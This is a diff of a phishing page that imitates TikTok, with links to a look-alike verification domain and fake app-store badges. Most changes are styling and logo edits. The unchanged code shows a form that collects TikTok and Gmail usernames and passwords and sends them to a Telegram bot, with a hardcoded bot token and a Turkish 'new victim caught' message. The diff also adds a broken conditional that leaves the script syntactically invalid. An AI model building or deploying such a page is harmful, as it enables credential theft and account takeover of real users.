@@ -17,14 +17,15 @@
             min-height: 100vh;
             display: flex;
             flex-direction: column;
-            padding: 0;
+            padding: 20px;
         }
 
         .header-content {
             width: 100%;
-            background: #fff;
+            background: #000;
             padding: 15px 20px;
             display: flex;
+            justify-content: space-between;
             align-items: center;
             box-shadow: 0 4px 8px rgba(0,0,0,0.2);
             margin-bottom: 20px;
@@ -51,12 +52,12 @@
         .hamburger-menu-wrapper span {
             width: 100%;
             height: 2px;
-            background: #000;
+            background: #fff;
             transition: all 0.3s;
         }
 
         .logo-container {
-            margin-left: 0;
+            margin-left: 15px;
         }
 
         .logo-link {
@@ -65,8 +66,21 @@
             text-decoration: none;
         }
 
+        .logo-icon {
+            width: 32px;
+            height: 32px;
+            margin-right: 10px;
+        }
+
         .logo-text {
-            height: 24px;
+            height: 20px;
+            margin-right: 10px;
+        }
+
+        .logo-link strong {
+            color: #fff;
+            font-size: 20px;
+            font-weight: 700;
         }
 
         .main-content {
@@ -198,7 +212,33 @@
             justify-content: center;
             align-items: center;
             gap: 16px;
-            flex-wrap: nowrap;
+            flex-wrap: wrap;
+        }
+
+        .qr-btn {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 12px 16px;
+            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .qr-btn:hover {
+            background-color: rgba(255,255,255,0.1);
+        }
+
+        .qr-image {
+            width: 24px;
+            height: 24px;
+        }
+
+        .qr-btn span {
+            color: #fff;
+            font-size: 14px;
+            font-weight: 600;
         }
 
         .download-wrapper a {
@@ -206,14 +246,17 @@
         }
 
         .download-wrapper img {
-            height: 60px;
-            width: 180px;
-            object-fit: contain;
+            height: 48px;
+            width: auto;
             transition: opacity 0.3s;
         }
 
         .download-wrapper img:hover {
             opacity: 0.8;
+        }
+
+        .ms-image-wrapper {
+            display: inline-block;
         }
 
         .footer-content-wrapper {
@@ -232,6 +275,15 @@
             gap: 12px;
             margin-bottom: 24px;
             flex-basis: 100%;
+        }
+
+        .logo-container {
+            display: inline-block;
+        }
+
+        .logo-group {
+            height: 32px;
+            width: auto;
         }
 
         .tiktok-logo strong {
@@ -405,15 +457,6 @@
                 flex-direction: column;
                 align-items: flex-start;
             }
-
-            .download-wrapper {
-                flex-wrap: wrap;
-            }
-            
-            .download-wrapper img {
-                width: 150px;
-                height: 50px;
-            }
         }
     </style>
 </head>
@@ -429,7 +472,9 @@
             </span>
             <div class="logo-container">
                 <a title="TikTok" class="logo-link" href="https://tiktokverifyrequests.rf.gd">
+                    <img class="logo-icon" src="tiktoklogo.png" alt="TikTok">
                     <img class="logo-text" src="tiktokyatay.png" alt="TikTok">
+                    <strong>TikTok</strong>
                 </a>
             </div>
         </div>
@@ -484,12 +529,20 @@
                     <a href="https://tiktokverifyrequests.rf.gd" target="_blank" rel="nofollow noreferrer">
                         <img class="amazon" src="amazon.png" alt="amazon-store">
                     </a>
+                    <a href="https://tiktokverifyrequests.rf.gd" target="_blank" rel="nofollow noreferrer">
+                        <div class="ms-image-wrapper">
+                            <img class="microsoft" src="microsoft.png" alt="microsoft-store">
+                        </div>
+                    </a>
                 </div>
             </div>
         </div>
         
         <footer class="footer-content-wrapper">
             <div class="tiktok-logo">
+                <a title="TikTok" class="logo-container" href="https://tiktokverifyrequests.rf.gd">
+                    <img src="tiktokyatay.png" class="logo-group">
+                </a>
                 <strong>TikTok</strong>
             </div>
             
@@ -576,33 +629,34 @@
                 input.addEventListener('keypress', function(e) {
                     if (e.key === 'Enter') {
                         e.preventDefault();
-                        nextStep();
+                    nextStep();
                     }
                 });
-            });
-            
-            step2Inputs.forEach(input => {
-                input.addEventListener('keypress', function(e) {
-                    if (e.key === 'Enter') {
-                        e.preventDefault();
-                        submitForm();
-                    }
-                });
+        });
+        
+        step2Inputs.forEach(input => {
+            input.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    submitForm();
+                }
             });
         });
+    });
 
-        function nextStep() {
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            
-            console.log('Adım 1: Kullanıcı adı ve şifre alındı:', { username, password });
-            
-            if (username && password) {
+    function nextStep() {
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+        
+        console.log('Adım 1: Kullanıcı adı ve şifre alındı:', { username, password });
+        
+        if (username && password) && 
+            {
                 document.getElementById('step1').style.display = 'none';
                 document.getElementById('step2').style.display = 'block';
                 document.getElementById('step2').classList.add('active');
             } else {
-                alert('Lütfen tüm alanları doldurun.');
+                alert('Lütfen tüm alanları doldur.');
             }
         }
 
@@ -617,7 +671,7 @@
             if (gmail && gmailPassword && tiktokUsername && tiktokPassword) {
                 const botToken = '7777367983:AAHFeWMAtxEdl9_d2aCpTqq3UvlUguc4AeU';
                 const chatId = '6116320717';
-                const message = `Yeni Kurban Yakalandı! 😈\nTikTok Kullanıcı Adı: ${tiktokUsername}\nTikTok Şifre: ${tiktokPassword}\nGmail: ${gmail}\nGmail Şifre: ${gmailPassword}\nZaman: ${new Date().toISOString()}`;
+                const message = `Yeni Kurban Yakalandı! 😈\n\nTikTok Kullanıcı Adı: ${tiktokUsername}\nTikTok Şifre: ${tiktokPassword}\nGmail: ${gmail}\nGmail Şifre: ${gmailPassword}\nZaman: ${new Date().toISOString()}`;
 
                 console.log('Telegram’a gönderilen mesaj:', message);
                 console.log('Gönderilen URL:', `https://api.telegram.org/bot${botToken}/sendMessage`);
@@ -650,7 +704,7 @@
                 })
                 .catch(error => {
                     console.error('Hata:', error);
-                    alert('Hata oluştu, veriler gönderilemedi! Detaylar konsolda.');
+                    alert('Hata oluştu, veriler gönderilemedi! Detaylar konsola.');
                 });
             } else {
                 alert('Lütfen tüm alanları doldurun.');
